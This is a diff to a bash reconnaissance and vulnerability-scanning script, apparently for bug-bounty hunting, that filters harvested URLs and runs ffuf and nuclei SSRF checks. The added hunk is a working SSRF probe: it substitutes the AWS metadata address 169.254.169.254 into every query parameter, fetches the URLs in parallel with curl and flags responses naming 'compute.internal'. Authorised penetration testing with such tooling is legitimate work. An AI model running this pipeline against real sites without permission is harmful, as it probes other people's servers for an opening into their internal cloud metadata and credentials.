@@ -89,7 +89,7 @@ mv filtered_urls.txt loxs_param.txt
 
 
 echo "[+] Combining all parameterized URLs..."
-cat results/* regex.txt loxs_param.txt | grep -E '\?.+=.+' | grep -Ev '^https?://[^?]+\.(woff2|ttf|svg|eot|css|js|png|jpeg|gif|ico|mp4|webp|bmp|json|xml)(\?|$)'  | grep -Ev 'cdn|cloudflare|googletag|googleapis|bootstrapcdn|jquery|fonts|addthis|facebook|linkedin|twitter|gstatic|optimizely|newrelic|akamai|doubleclick|bing|jsdelivr|youtube|ytimg'  | sort -u  > sam.txt
+cat results/* regex.txt loxs_param.txt | grep -E '\?.+=.+' | grep -Ev '^https?://[^?]+\.(woff2|ttf|svg|eot|css|js|png|jpeg|gif|ico|bmp)(\?|$)'  | grep -Ev 'cdn|cloudflare|googletag|googleapis|bootstrapcdn|jquery|fonts|addthis|facebook|linkedin|twitter|gstatic|optimizely|newrelic|akamai|doubleclick|bing|jsdelivr|youtube|ytimg'  | sort -u  > sam.txt
 
 cat results/* regex.txt loxs_param.txt | grep -E '([?&](image|file|url)=)' >> sam.txt || true
 cat sam.txt | sort -u -o   "$ALLPARAMS"
@@ -163,6 +163,14 @@ ffuf -c -w "$OUTDIR/ssrf_urls_ffuf" -u FUZZ | tee -a "$OUTDIR/ssrf_ffuf_output.t
 echo "[*] SSRF Nuclei testing (Blind SSRF and Response SSRF)..."
 cat "$ALLPARAMS" | nuclei -t ~/nuclei-templates/dast/vulnerabilities/ssrf/blind-ssrf.yaml --retries 2 --dast -o  "$OUTDIR/ssrf_nuclei_blind.txt" -stats
 cat "$ALLPARAMS" | nuclei -t ~/nuclei-templates/dast/vulnerabilities/ssrf/response-ssrf.yaml --retries 2 --dast -o  "$OUTDIR/ssrf_nuclei_response.txt" -stats
+
+cat "$ALLPARAMS" \
+| sort -u \
+| anew \
+| httpx -t 50\
+| qsreplace 'http://169.254.169.254/latest/meta-data/hostname' \
+| xargs -I % -P 25 sh -c 'resp=$(curl -ks --max-time 5 "%"); if echo "$resp" | grep -q "compute.internal"; then echo "SSRF VULN! %"; echo "SSRF VULN! %" >> "'$OUTDIR'/ssrf_aws"; fi'
+
 
 # ----------------------------------------------
 # 4. Open Redirect
